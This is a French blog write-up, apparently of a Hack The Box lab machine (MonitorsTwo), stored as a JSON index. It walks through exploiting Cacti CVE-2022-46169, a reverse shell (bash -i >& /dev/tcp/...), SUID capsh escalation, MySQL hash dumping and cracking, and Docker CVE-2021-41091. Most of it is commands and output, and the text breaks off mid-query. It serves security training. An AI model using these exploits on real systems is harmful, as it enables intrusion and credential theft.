
[{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"16 December 2023","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rI- Vue d\u0026rsquo;ensemble de la machine: #\rMonitorsTwo est une machine Linux de difficult√© facile. Elle met en avant quelques vuln√©rabilit√©s et erreurs de configurations qui seront exploit√©es afin de prendre le contr√¥le du syst√®me suivant notre kill-chain ci-apr√®s:\nAcc√®s Initial:\nUne premi√®re √©numeration rapide nous permet de d√©couvrir une application web vuln√©rable √† une ex√©cution de code √† distance (RCE) avec pr√©-authentification via un en-t√™te X-Forwarded-For malveillant. L\u0026rsquo;exploitation de cette vuln√©rabilit√© d√©bouche sur un shell au sein d\u0026rsquo;un conteneur Docker.\n√âlevation de privil√®ges (1): Un binaire capsh mal configur√© avec le bit SUID activ√© permet un acc√®s root √† l\u0026rsquo;int√©rieur du conteneur.\nMouvement lat√©ral: La d√©couverte d\u0026rsquo;identifiants MySQL permet le dumping d\u0026rsquo;un hash, qui, une fois craqu√©, fournit un acc√®s SSH √† la machine.\n√âlevation de privil√®ges (2): Une √©num√©ration plus pouss√©e r√©v√®le une version de Docker vuln√©rable qui permet √† un utilisateur de faible privil√®ge d\u0026rsquo;acc√©der aux syst√®mes de fichiers des autres conteneurs mont√©s. En tirant parti de l\u0026rsquo;acc√®s root dans le conteneur, un binaire bash avec le bit SUID activ√© sera copi√©, afin d\u0026rsquo;obtenir une √©l√©vation de privil√®ges sur l\u0026rsquo;h√¥te.\nII- Collecte d\u0026rsquo;informations: #\rScan de ports Nmap #\r‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~/HTB/Monitorstwo] ‚îî‚îÄ$sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.211 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Login to Cacti |_http-server-header: nginx/1.18.0 (Ubuntu) Informations utiles:\nServeur web nginx 1.18.0 en √©coute, pouvant √™tre un portail de connexion. Serveur SSH en mode √©coute (nous auront besoin d\u0026rsquo;identifiants valides pour y acc√©der). III- Acc√®s Initial #\rPage d\u0026rsquo;accueil :\nNous avons la version de l\u0026rsquo;application Cacti 1.2.22 il s\u0026rsquo;agira donc de chercher l\u0026rsquo;existence de vuln√©rabilit√©s connues sur cette version:\nIl en ressort plusieurs r√©f√©rences pour la m√™me vuln√©rabilit√© de type RCE: CVE-2022-46169\nVuln√©rabilit√©: L\u0026rsquo;exploit consiste √† acc√©der √† l\u0026rsquo;endpoint vuln√©rable /remote_agent.php, dont l\u0026rsquo;authentification peut √™tre contourn√©e en raison d\u0026rsquo;une impl√©mentation faible de la fonction get_client_addr qui utilise un en-t√™te contr√¥l√© par l\u0026rsquo;utilisateur, nomm√©ment X-Forwarded-For, pour authentifier le client. Une fois que cette v√©rification initiale est contourn√©e, nous d√©clencherons ensuite la fonction poll_for_data via l\u0026rsquo;action polldata, qui est vuln√©rable √† l\u0026rsquo;injection de commande via le param√®tre $poller_id qui est pass√© √† proc_open, qui est une fonction PHP qui ex√©cute des commandes syst√®me.\nEssayons donc ce PoC:\n# Nous allons configurer un listenner notament nc: ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~/HTB/Monitorstwo] ‚îî‚îÄ$ nc -lvnp 1337 listening on [any] 1337 ... # clonage du repo github: ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~/HTB/Monitorstwo] ‚îî‚îÄ$ sudo git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22 Cloning into \u0026#39;CVE-2022-46169-CACTI-1.2.22\u0026#39;... remote: Enumerating objects: 18, done. remote: Counting objects: 100% (18/18), done. remote: Compressing objects: 100% (16/16), done. remote: Total 18 (delta 4), reused 4 (delta 1), pack-reused 0 Receiving objects: 100% (18/18), 5.07 KiB | 2.53 MiB/s, done. Resolving deltas: 100% (4/4), done. ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22] ‚îî‚îÄ$ cd CVE-2022-46169-CACTI-1.2.22/ ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~/HTB/Monitorstwo/CVE-2022-46169-CACTI-1.2.22] ‚îî‚îÄ$ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.xx.xx --LPORT=1337 Checking... The target is vulnerable. Exploiting... Bruteforcing the host_id and local_data_ids Bruteforce Success!! # Obtention du reverse shell: ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 39056 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@50bca5e748b0:/var/www/html$ Simple et efficace !\nIV- √âlevation de privil√®ges (1) #\rApr√®s avoir examin√© divers r√©pertoires et fichiers, rien de particuli√®rement int√©ressant n\u0026rsquo;est apparu. La seule chose √† noter est que nous sommes actuellement dans un conteneur Docker, comme le sugg√®re la pr√©sence du fichier /.dockerenv, ce qui est √©galement confirm√© par notre nom d\u0026rsquo;h√¥te, √† savoir www-data@50bca5e748b0:\nwww-data@50bca5e748b0:/var/www/html$ ls -la / total 88 drwxr-xr-x 1 root root 4096 Mar 21 2023 . drwxr-xr-x 1 root root 4096 Mar 21 2023 .. -rwxr-xr-x 1 root root 0 Mar 21 2023 .dockerenv drwxr-xr-x 1 root root 4096 Mar 22 2023 bin Nous pouvons v√©rifier s\u0026rsquo;il y a quelque chose d\u0026rsquo;int√©ressant qui peut √™tre ex√©cut√© avec des privil√®ges √©lev√©s notament tous les fichiers sur le syst√®me de fichiers qui ont l\u0026rsquo;attribut setuid (suid) activ√©.\nwww-data@50bca5e748b0:/var/www/html$ find / -type f -perm -u=s 2\u0026gt;/dev/null find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su Le binaire capsh semble convenir √† ce que je cherche. En effectuant une recherche rapide sur GTFOBins (un site incontournable qui r√©pertorie une liste de binaires Unix pouvant √™tre utilis√©s pour contourner les restrictions de s√©curit√© locale dans des syst√®mes mal configur√©s) nous obtenons ceci :\nSuivons donc les directives de GTFOBins :\nwww-data@50bca5e748b0:/var/www$ /sbin/capsh --gid=0 --uid=0 -- /sbin/capsh --gid=0 --uid=0 -- id uid=0(root) gid=0(root) groups=0(root),33(www-data) Et ainsi j\u0026rsquo;obtiens les droits root. Cependant nous n\u0026rsquo;avons pas encore trouv√© notre flag puisse que nous sommes toujours dans le conteneur docker.\nV- Mouvement lat√©rral #\rLorsque nous listons les fichiers dans le r√©pertoire racine (/), nous voyons un script appel√© entrypoint.sh:\nls -l total 76 drwxr-xr-x 1 root root 4096 Mar 22 2023 bin drwxr-xr-x 2 root root 4096 Mar 22 2023 boot drwxr-xr-x 5 root root 340 Jan 25 14:34 dev -rw-r--r-- 1 root root 648 Jan 5 2023 entrypoint.sh \u0026lt;SNIP\u0026gt; V√©rifions donc son contenu:\nwww-data@50bca5e748b0:/$ cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo \u0026#34;database is connected\u0026#34; if [[ ! $(mysql --host=db --user=root --password=root cacti -e \u0026#34;show tables\u0026#34;) =~ \u0026#34;automation_devices\u0026#34; ]]; then mysql --host=db --user=root --password=root cacti \u0026lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e \u0026#34;UPDATE user_auth SET must_change_password=\u0026#39;\u0026#39; WHERE username = \u0026#39;admin\u0026#39;\u0026#34; mysql --host=db --user=root --password=root cacti -e \u0026#34;SET GLOBAL time_zone = \u0026#39;UTC\u0026#39;\u0026#34; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ \u0026#34;${1#-}\u0026#34; != \u0026#34;$1\u0026#34; ]; then set -- apache2-foreground \u0026#34;$@\u0026#34; fi exec \u0026#34;$@\u0026#34; Nous voyons plusieurs commandes mysql ex√©cut√©es en tant que root. Le script r√©v√®le √©galement que le nom d\u0026rsquo;utilisateur admin existe et que le champ li√© au mot de passe must_change_password est pr√©sent dans la table user_auth.\n$ mysql --host=db --user=root --password=root cacti -e \u0026#34;SELECT * FROM user_auth\u0026#34; id username password realm full_name email_address must_change_password password_change show_tree show_list show_preview graph_settings login_opts policy_graphs policy_trees policy_hosts policy_graph_templates enabled lastchange lastlogin password_history locked failed_attempts lastfail reset_perms 1 admin $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC 0 Jamie Thompson admin@monitorstwo.htb 1 on on on on on 2 11 1 1 on -1 -1 -1 0 0 663348655 3 guest 43e9a4ab75570f5b 0 Guest Account on on on on on 3 1 1 1 1 1 -1 -1-1 0 0 0 4 marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 0 Marcus Brune marcus@monitorstwo.htb on on on on 1 11 1 1 on -1 -1 on 0 0 2135691668 Nous obtenons ainsi les identifiants des utilisateurs admin et marcus :\nadmin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C Essayons de cracker ces identifiants sur notre machine d\u0026rsquo;attaque en utilisant john:\n‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~/HTB/Monitorstwo] ‚îî‚îÄ$ cat hashes.txt $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 16 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status funkymonkey (?) Ainsi nous avons les identifiants de marcus:funkymonkey.Il ne reste plus qu\u0026rsquo;√†eaayer de se connecter via ssh √† notre cible et obtenir notre premier flag:\n‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ssh marcus@10.10.11.211 ‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ cat user.txt \u0026lt;********************************\u0026gt; VI- √âlevation de privil√®ges (2) #\rApr√®s fait le tour des r√©pertoires et fichiers, nous trouvons finallement quelque chose d\u0026rsquo;int√©ressant :\n‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[/var] ‚îî‚îÄ$ cat mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all, We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team En gros ce mail √©crit par l\u0026rsquo;administrateur de monitorstwo.htb est destin√©e √† tous les utilisateurs du syst√®me et aborde principalement trois vuln√©rabilit√©s r√©cemment d√©couvertes qui n√©cessitent une attention imm√©diate. Nous alllons donc investiguer ces trois vulns et voir s\u0026rsquo;il y en a un que nous pourrons exploiter pour avancer dans notre t√¢che.\nLa premi√®re, CVE-2021-33033 concerne les versions du noyau ant√©rieures √† 5.11.14, voyons donc ce que nous avons actuellement : marcus@monitorstwo:/var$ uname -a Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux Bien que cela semble √™tre une version obsol√®te, la s√©rie de versions 5.4 est en fait la derni√®re selon la documentation officielle:\nLa seconde CVE-2020-25706 fait r√©f√©rence √† une vuln√©rabilit√© XSS pour Cacti 1.2.13 or la version de l\u0026rsquo;application cible est Cacti 1.2.22. -Il ne nous reste que la derni√®re vuln : CVE-2021-41091, qui concerne le Docker engine, nomm√© Moby version 20.10.9. Ce qui nous arrangerait compte tenu de l\u0026rsquo;environnement o√π nous somme actuellement.\nUne v√©rification de la version de docker nous permet de voir qu\u0026rsquo;il s\u0026rsquo;agit de la version 20.10.5 qui est spoiller alert vuln√©rable:\n‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[/var] ‚îî‚îÄ$ docker --version Docker version 20.10.5+dfsg1, build 55c4c88 Nous devrions donc pouvoir exploiter ce CVE. Apr√®s quelques recherches, nous tombons sur ce POC.\nVuln√©rabilit√©: Plusieurs r√©pertoires dans /var/lib/docker, qui sont mont√©s et utilis√©s par les conteneurs Docker, sont accessibles aux utilisateurs √† faible privil√®ges. Cela implique que si un attaquant obtient l\u0026rsquo;acc√®s root √† l\u0026rsquo;int√©rieur d\u0026rsquo;un conteneur, il pourrait cr√©er des fichiers SUID arbitraires avec lesquels un utilisateur non privil√©gi√© √† l\u0026rsquo;ext√©rieur du conteneur pourrait interagir et utiliser pour une √©levation de privil√®ges.\nCe que nous devons donc faire :\n1- R√©p√©ter notre processus initial pour obtenir un acc√®s RCE et une √©l√©vation de privil√®ges via le binaire capsh en utilisant CVE-2022-46169.\n2- Attribuer les permissions appropri√©es au binaire bash avec la commande chmod u+s /bin/bash.\n3- Cloner le PoC du CVE-2021-41091 sur notre machine d\u0026rsquo;attaque, transf√©rer le script bash (exp.sh) sur la cible en utilisant le compte marcus via SSH, et l\u0026rsquo;ex√©cuter en utilisant l\u0026rsquo;utilisateur marcus.\nR√©p√©tons notre acc√®s initial puis obtenons les droits root √† l\u0026rsquo;int√©rieur du conteneur :\n# obtention des droits root √† l\u0026#39;int√©rieur du conteneur whoami root id uid=0(root) gid=0(root) groups=0(root),33(www-data) # attribution des permissions SUID au binaire bash chmod u+s /bin/bash Depuis notre machine d\u0026rsquo;attaque :\n```bash\r# clonage du repo vers ma machine\r$ sudo git clone https://github.com/UncleJ4ck/CVE-2021-41091\r[sudo] password for kali:\rCloning into 'CVE-2021-41091'...\rremote: Enumerating objects: 25, done.\rremote: Counting objects: 100% (25/25), done.\rremote: Compressing objects: 100% (23/23), done.\rremote: Total 25 (delta 6), reused 3 (delta 0), pack-reused 0\rReceiving objects: 100% (25/25), 6.95 KiB | 6.96 MiB/s, done.\rResolving deltas: 100% (6/6), done.\r# move within the directory\r$ cd CVE-2021-41091/\r# checking permissions\r$ ls -l\rtotal 8\r-rwxr-xr-x 1 root root 2446 Jan 25 18:18 exp.sh\r-rw-r--r-- 1 root root 2616 Jan 25 18:18 README.md\r# start a Python HTTP server\r$ python3 -m http.server\rServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\r10.10.11.211 - - [25/Jan/2024 18:19:47] \u0026quot;GET /exp.sh HTTP/1.1\u0026quot; 200 -\r```\rDepuis le terminal de marcus:\n# T√©l√©chargement du script ‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~] ‚îî‚îÄ$ wget http://10.10.xx.xx:8000/exp.sh --2024-01-25 18:19:47-- http://10.10.xx.xx:8000/exp.sh Connecting to 10.10.14.33:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 2446 (2.4K) [text/x-sh] Saving to: ‚Äòexp.sh‚Äô exp.sh 100%[========================\u0026gt;] 2.39K --.-KB/s in 0s 2024-01-25 18:19:47 (356 MB/s) - ‚Äòexp.sh‚Äô saved [2446/2446] # Attribution de la permission d\u0026#39;ex√©cution\r‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~]\r‚îî‚îÄ$ chmod +x exp.sh # V√©rification des permissions\r‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~]\r‚îî‚îÄ$ ls -l exp.sh\rtotal 8\r-rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh # Ex√©cution du script\r‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[/var]\r‚îî‚îÄ$ ./exp.sh\r[!] Vulnerable to CVE-2021-41091\r[!] Now connect to your Docker container that is accessible and obtain root access !\r[\u0026gt;] After gaining root access execute this command (chmod u+s /bin/bash)\rDid you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes\r[!] Available Overlay2 Filesystems:\r/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\r/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[!] Iterating over the available Overlay2 filesystems !\r[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\r[x] Could not get root access in \u0026#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged\u0026#39;\r[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[!] Rooted !\r[\u0026gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r[?] If it didnt spawn a shell go to this path and execute \u0026#39;./bin/bash -p\u0026#39;\r[!] Spawning Shell\rbash-5.1# exit Direction vers le \u0026ldquo;Current Vulnerable Path\u0026rdquo; mentionn√© ci-dessus ‚îå‚îÄ‚îÄ(marcus„âømonitorstwo)-[~]\r‚îî‚îÄ$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged\r# √âx√©cution de la commande \u0026#39;./bin/bash -p\u0026#39; pour lancer l\u0026#39;interpr√©teur en ``privileged mode``\r$ ./bin/bash -p\rbash-5.1# id\ruid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)\rbash-5.1# cat /root/root.txt\r\u0026lt;********************************\u0026gt; Pwned üóπ #\rAinsi s\u0026rsquo;ach√®ve notre mission ;) VII- Extra - IppSec‚Äôs Exploit #\rCette section fera office d\u0026rsquo;ouverture et sera bas√© sur la vid√©o de IppSec\u0026rsquo;s video walkthrough o√π l\u0026rsquo;exploitation est r√©alis√© de fa√ßon manuelle. On apprend toujours de nouvelles m√©thodologies et astuces dans ses vid√©os donc √ßa vaut le d√©tour.\nAcc√®s Initial #\rNous r√©aliserons l\u0026rsquo;exploitation du CVE-2022-46169 en se basant sur le post de Rapid7) de fa√ßon manuelle:\nSi les param√®tres LOCAL_DATA_ID et/ou HOST_ID ne sont pas d√©finis, le module tentera de forcer la valeur (ou les valeurs) manquante(s). Si une combinaison valide est trouv√©e, le module utilisera ces valeurs pour tenter l\u0026rsquo;exploitation. Si LOCAL_DATA_ID et/ou HOST_ID sont tous les deux d√©finis, le module tentera imm√©diatement l\u0026rsquo;exploitation. Pendant l\u0026rsquo;exploitation, le module envoie une requ√™te GET √† /remote_agent.php avec le param√®tre d\u0026rsquo;action d√©fini sur polldata et l\u0026rsquo;en-t√™te X-Forwarded-For d√©fini sur la valeur fournie pour X_FORWARDED_FOR_IP (par d√©faut 127.0.0.1). WNous pouvons commencer par intercepter une requ√™te via Burp, par exemple, une requ√™te de connexion POST en utilisant des identifiants al√©atoires, changer la m√©thode HTTP en requ√™te GET et l\u0026rsquo;URL en /remote_agent.php?action=polldata\u0026amp;local_data_ids[]={local_data_ids}\u0026amp;host_id={host_id}\u0026amp;poller_id=1{payload}``.\nLe chemin d\u0026rsquo;URL peut √™tre trouv√© ici:\nNous recevons l\u0026rsquo;erreur FATAL: You are not authorized to use this service. Commen√ßons par ajouter l\u0026rsquo;en-t√™te X-Forwarded-For avec la valeur localhost et voyons ce qui se passe.\nCette fois, nous n\u0026rsquo;avons pas re√ßu d\u0026rsquo;erreur FATAL, mais une erreur de Validation concernant le param√®tre host_id. Supprimons les variables, d√©finissons tous les identifiants sur 1, et essayons un payload simple, telle que sleep 5.\nLe payload sleep+5 est la version URL-encod√©e de la charge utile sleep 5.\nNous n\u0026rsquo;avons re√ßu aucune erreur en retour, mais la charge utile n\u0026rsquo;a pas fonctionn√© non plus. Cela est logique car, selon la description de la vuln√©rabilit√© :\nSi une combinaison valide est trouv√©e, le module utilisera ces informations pour tenter l\u0026rsquo;exploitation\nAinsi, nous devons effectuer une attaque par brute force sur les param√®tres local_data_id et host_id jusqu\u0026rsquo;√† ce que nous trouvions une combinaison valide de valeurs qui permettra √† notre charge utile de fonctionner. Nous pouvons l\u0026rsquo;automatiser en utilisant l\u0026rsquo;outil Intruder :\nLes deux charges utiles 1 et 2 sont d√©finies comme une liste s√©quentielle de nombres de 1 √† 10\nIntruder montre qu\u0026rsquo;une seule combinaison de charges utiles a entra√Æn√© un d√©lai de 5 secondes (caus√© par notre charge utile sleep+5) : local_data_ids[]=6 et host_id=1 ! V√©rifions cela manuellement : Ce qui se passe ici, c\u0026rsquo;est que certaines valeurs du param√®tre rdd_name de la r√©ponse HTTP sont exploitables : uptime en est une (nous pouvons trouver la liste compl√®te des param√®tres exploitables ici. Donc, nous effectuons une attaque par force brute sur les param√®tres local_data_id et host_id jusqu\u0026rsquo;√† ce qu\u0026rsquo;une combinaison d\u0026rsquo;entre eux renvoie l\u0026rsquo;un des param√®tres exploitables dans la r√©ponse :\nMaintenant que nous avons trouv√© la bonne combinaison de valeurs de param√®tres, nous pouvons envoyer du code (ici un reverse shell) en tant que charge utile: bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/1337 0\u0026gt;\u0026amp;1'; L\u0026rsquo;encoder en URL (en appuyant sur CTRL+U) puis mettre en place sur notre machine d\u0026rsquo;attaque un Listener (netcat en mode √©coute) et envoyer la requ√™te :\n# listener nc ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.xx.xx] 36722 # Obtention du shell invers√© ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.10.xx.xx] from (UNKNOWN) [10.10.11.211] 36722 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@50bca5e748b0:/var/www/html$ Mouvement lat√©ral #\rId√©alement, nous devrions d\u0026rsquo;abord stabiliser notre shell. Python n\u0026rsquo;est pas install√© sur la cible, donc nous ne pouvons pas utiliser le module pty(python3 import pty;pty.spawn'(\u0026quot;/bin/bash\u0026quot;)') pour y parvenir. Cependant, nous pouvons utiliser script :\n# Stabilisation du shell avec script www-data@50bca5e748b0:/var/www/html$ which script which script /usr/bin/script www-data@50bca5e748b0:/var/www/html$ script -O /dev/null -q /bin/bash script -O /dev/null -q /bin/bash $ bash bash # Mise en arri√®re plan de la connexion www-data@50bca5e748b0:/var/www/html$ ^Z [1]+ Stopped nc -lvnp 1337 # Remise en avant plan dans notre shell ‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ stty raw -echo; fg nc -lvnp 1337 www-data@50bca5e748b0:/var/www/html$ Maintenant, nous devons obtenir les valeurs des variables rows(lignes) et cols(colonnes) depuis notre machine d\u0026rsquo;attaque :\n‚îå‚îÄ‚îÄ(raizen„âøRaizen)-[~] ‚îî‚îÄ$ stty -a speed 38400 baud; rows 51; columns 209; line = 0; intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = \u0026lt;undef\u0026gt;; eol2 = \u0026lt;undef\u0026gt;; swtch = \u0026lt;undef\u0026gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc Et enfin, nous devons d√©finir les m√™mes valeurs sur notre machine cible :\nwww-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209 www-data@50bca5e748b0:/var/www/html$ export TERM=xterm Nous avons maintenant notre point d\u0026rsquo;entr√©e initial avec un shell bash appropri√© ! √âtant donn√© que c\u0026rsquo;est un serveur d\u0026rsquo;application web, nous devrons probablement v√©rifier les fichiers de configuration de la base de donn√©es :\n# Recherche de fichiers de configuration www-data@50bca5e748b0:/var/www/html$ find . | grep config ./include/config.php ./docs/images/graphs-edit-nontemplate-configuration.png ./docs/apache_template_config.html # Recherche de cha√Ænes de caract√®res li√©es √† la base de donn√©es dans le fichier de configuration www-data@50bca5e748b0:/var/www/html$ grep database include/config.php * Make sure these values reflect your actual database/host/user/password $database_type = \u0026#39;mysql\u0026#39;; $database_default = \u0026#39;cacti\u0026#39;; $database_hostname = \u0026#39;db\u0026#39;; $database_username = \u0026#39;root\u0026#39;; $database_password = \u0026#39;root\u0026#39;; $database_port = \u0026#39;3306\u0026#39;; $database_retries = 5; $database_ssl = false; $database_ssl_key = \u0026#39;\u0026#39;; $database_ssl_cert = \u0026#39;\u0026#39;; $database_ssl_ca = \u0026#39;\u0026#39;; $database_persist = false; #$rdatabase_type = \u0026#39;mysql\u0026#39;; #$rdatabase_default = \u0026#39;cacti\u0026#39;; #$rdatabase_hostname = \u0026#39;localhost\u0026#39;; #$rdatabase_username = \u0026#39;cactiuser\u0026#39;; #$rdatabase_password = \u0026#39;cactiuser\u0026#39;; #$rdatabase_port = \u0026#39;3306\u0026#39;; #$rdatabase_retries = 5; #$rdatabase_ssl = false; #$rdatabase_ssl_key = \u0026#39;\u0026#39;; #$rdatabase_ssl_cert = \u0026#39;\u0026#39;; #$rdatabase_ssl_ca = \u0026#39;\u0026#39;; * Save sessions to a database for load balancing * are defined in lib/database.php Le fichier de configuration ci-dessus contient tout ce dont nous avons besoin pour nous connecter au serveur de base de donn√©es :\n# Connexion au serveur mysql www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 221 Server version: 5.7.40 MySQL Community Server (GPL) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. # Listage des bases de donn√©es MySQL [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | cacti | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.002 sec) # Selection de la base de donn√©e: MySQL [(none)]\u0026gt; use cacti; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed # Listage des tables de bases de donn√©es MySQL [cacti]\u0026gt; show tables; +-------------------------------------+ | Tables_in_cacti | +-------------------------------------+ \u0026lt;SNIP\u0026gt; | user_auth | | user_auth_cache | | user_auth_group | | user_auth_group_members | | user_auth_group_perms | | user_auth_group_realm | | user_auth_perms | | user_auth_realm | | user_domains | | user_domains_ldap | | user_log | | vdef | | vdef_items | | version | +-------------------------------------+ 111 rows in set (0.001 sec) # Extraction de la premi√®re ligne de la table pour √©num√©rer ses champs MySQL [cacti]\u0026gt; SELECT * FROM user_auth LIMIT 1 \\G; *************************** 1. row *************************** id: 1 username: admin password: $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC realm: 0 full_name: Jamie Thompson email_address: admin@monitorstwo.htb must_change_password: password_change: on show_tree: on show_list: on show_preview: on graph_settings: on login_opts: 2 policy_graphs: 1 policy_trees: 1 policy_hosts: 1 policy_graph_templates: 1 enabled: on lastchange: -1 lastlogin: -1 password_history: -1 locked: failed_attempts: 0 lastfail: 0 reset_perms: 663348655 1 row in set (0.000 sec) ERROR: No query specified -Nous pouvons d√©j√† y trouver les information de connexion sur le compte ``admin`` # selection des champs qui nous int√©ressent (noms et mots de passe): MySQL [cacti]\u0026gt; SELECT username, password FROM user_auth ; +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | admin | 